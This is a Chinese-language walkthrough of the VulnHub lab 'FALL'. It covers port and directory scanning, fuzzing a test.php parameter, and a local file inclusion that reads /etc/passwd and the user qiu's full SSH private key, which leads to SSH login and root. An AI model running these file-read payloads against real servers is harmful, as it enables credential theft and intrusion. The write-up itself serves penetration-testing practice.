# digitalworld.local: FALL

> https://download.vulnhub.com/digitalworld/FALL.7z

靶场IP：`192.168.32.202`

扫描对外端口服务

```
┌──(root💀kali)-[/tmp]
└─# nmap -p 1-65535 -sV  192.168.32.202
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 02:20 EDT
Nmap scan report for 192.168.32.202
Host is up (0.00024s latency).
Not shown: 65368 filtered tcp ports (no-response), 154 filtered tcp ports (host-prohibited)
PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 7.8 (protocol 2.0)
80/tcp    open   http        Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
111/tcp   closed rpcbind
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
443/tcp   open   ssl/http    Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
445/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp  open   mysql       MySQL (unauthorized)
8000/tcp  closed http-alt
8080/tcp  closed http-proxy
8443/tcp  closed https-alt
9090/tcp  open   http        Cockpit web service 162 - 188
10080/tcp closed amanda
10443/tcp closed cirrossp
MAC Address: 00:0C:29:18:2F:1F (VMware)
Service Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.85 seconds

```

浏览器访问80端口

![image-20220905142656824](../../.gitbook/assets/image-20220905142656824.png)

爆破web目录

```
┌──(root💀kali)-[/tmp]
└─# gobuster dir -u http://192.168.32.202 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt                                                                                                        
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.32.202
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2022/09/05 22:07:37 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 8385]
/modules              (Status: 301) [Size: 238] [--> http://192.168.32.202/modules/]
/uploads              (Status: 301) [Size: 238] [--> http://192.168.32.202/uploads/]
/doc                  (Status: 301) [Size: 234] [--> http://192.168.32.202/doc/]    
/admin                (Status: 301) [Size: 236] [--> http://192.168.32.202/admin/]  
/assets               (Status: 301) [Size: 237] [--> http://192.168.32.202/assets/] 
/test.php             (Status: 200) [Size: 80]                                      
/lib                  (Status: 301) [Size: 234] [--> http://192.168.32.202/lib/]    
/config.php           (Status: 200) [Size: 0]                                       
/robots.txt           (Status: 200) [Size: 79]                                      
/error.html           (Status: 200) [Size: 80]                                      
/tmp                  (Status: 301) [Size: 234] [--> http://192.168.32.202/tmp/]    
/missing.html         (Status: 200) [Size: 168]                                     
/phpinfo.php          (Status: 200) [Size: 17]                                      
                                                                                    
===============================================================
2022/09/05 22:11:38 Finished
===============================================================

```

发现`test.php`，需要添加GET参数

![image-20220906101233631](../../.gitbook/assets/image-20220906101233631.png)

爆破参数

```
┌──(root💀kali)-[/tmp]
└─# ffuf -c -w /opt/SecLists/Discovery/Web-Content/common.txt -u 'http://192.168.32.202/test.php?FUZZ=/etc/passwd' -fs 80

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.32.202/test.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 80
________________________________________________

file                    [Status: 200, Size: 1633, Words: 36, Lines: 33, Duration: 2ms]
:: Progress: [4713/4713] :: Job [1/1] :: 4386 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

```

![image-20220906112025018](../../.gitbook/assets/image-20220906112025018.png)

获取qiu用户的私钥

```
┌──(root💀kali)-[/tmp]
└─# curl http://192.168.32.202/test.php?file=/home/qiu/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAvNjhOFOSeDHy9K5vnHSs3qTjWNehAPzT0sD3beBPVvYKQJt0AkD0
FDcWTSSF13NhbjCQm5fnzR8td4sjJMYiAl+vAKboHne0njGkBwdy5PgmcXyeZTECIGkggX
61kImUOIqtLMcjF5ti+09RGiWeSmfIDtTCjj/+uQlokUMtdc4NOv4XGJbp7GdEWBZevien
qXoXtG6j7gUgtXX1Fxlx3FPhxE3lxw/AfZ9ib21JGlOyy8cflTlogrZPoICCXIV/kxGK0d
Zucw8rGGMc6Jv7npeQS1IXU9VnP3LWlOGFU0j+IS5SiNksRfdQ4mCN9SYhAm9mAKcZW8wS
vXuDjWOLEwAAA9AS5tRmEubUZgAAAAdzc2gtcnNhAAABAQC82OE4U5J4MfL0rm+cdKzepO
NY16EA/NPSwPdt4E9W9gpAm3QCQPQUNxZNJIXXc2FuMJCbl+fNHy13iyMkxiICX68Apuge
d7SeMaQHB3Lk+CZxfJ5lMQIgaSCBfrWQiZQ4iq0sxyMXm2L7T1EaJZ5KZ8gO1MKOP/65CW
iRQy11zg06/hcYlunsZ0RYFl6+J6epehe0bqPuBSC1dfUXGXHcU+HETeXHD8B9n2JvbUka
U7LLxx+VOWiCtk+ggIJchX+TEYrR1m5zDysYYxzom/uel5BLUhdT1Wc/ctaU4YVTSP4hLl
KI2SxF91DiYI31JiECb2YApxlbzBK9e4ONY4sTAAAAAwEAAQAAAQArXIEaNdZD0vQ+Sm9G
NWQcGzA4jgph96uLkNM/X2nYRdZEz2zrt45TtfJg9CnnNo8AhhYuI8sNxkLiWAhRwUy9zs
qYE7rohAPs7ukC1CsFeBUbqcmU4pPibUERes6lyXFHKlBpH7BnEz6/BY9RuaGG5B2DikbB
8t/CDO79q7ccfTZs+gOVRX4PW641+cZxo5/gL3GcdJwDY4ggPwbU/m8sYsyN1NWJ8NH00d
X8THaQAEXAO6TTzPMLgwJi+0kj1UTg+D+nONfh7xeXLseST0m1p+e9C/8rseZsSJSxoXKk
CmDy69aModcpW+ZXl9NcjEwrMvJPLLKjhIUcIhNjf4ABAAAAgEr3ZKUuJquBNFPhEUgUic
ivHoZH6U82VyEY2Bz24qevcVz2IcAXLBLIp+f1oiwYUVMIuWQDw6LSon8S72kk7VWiDrWz
lHjRfpUwWdzdWSMY6PI7EpGVVs0qmRC/TTqOIH+FXA66cFx3X4uOCjkzT0/Es0uNyZ07qQ
58cGE8cKrLAAAAgQDlPajDRVfDWgOWJj+imXfpGsmo81UDaYXwklzw4VM2SfIHIAFZPaA0
acm4/icKGPlnYWsvZCksvlUck+ti+J2RS2Mq9jmKB0AVZisFazj8qIde3SPPwtR7gBR329
JW3Db+KISMRIvdpJv+eiKQLg/epbSdwXZi0DJoB0a15FsIAQAAAIEA0uQl0d0p3NxCyT/+
Q6N+llf9TB5+VNjinaGu4DY6qVrSHmhkceHtXxG6h9upRtKw5BvOlSbTatlfMZYUtlZ1mL
RWCU8D7v1Qn7qMflx4bldYgV8lf18sb6g/uztWJuLpFe3Ue/MLgeJ+2TiAw9yYoPVySNK8
uhSHa0dvveoJ8xMAAAAZcWl1QGxvY2FsaG9zdC5sb2NhbGRvbWFpbgEC
-----END OPENSSH PRIVATE KEY-----

```

ssh登录qiu用户

```
┌──(root💀kali)-[/tmp]
└─# ssh -i id_rsa  qiu@192.168.32.202 
The authenticity of host '192.168.32.202 (192.168.32.202)' can't be established.
ECDSA key fingerprint is SHA256:+P4Rs5s4ipya3/t+GBoy0WjQqL/LaExt9MFvWgld4xc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.32.202' (ECDSA) to the list of known hosts.
Web console: https://FALL:9090/ or https://192.168.32.202:9090/

Last login: Sun Sep  5 19:28:51 2021
[qiu@FALL ~]$ id
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu),10(wheel)

```

查看`.bash_history`文件

![image-20220906112352166](../../.gitbook/assets/image-20220906112352166.png)

提权成功

![image-20230208134746313](../../.gitbook/assets/image-20230208134746313.png)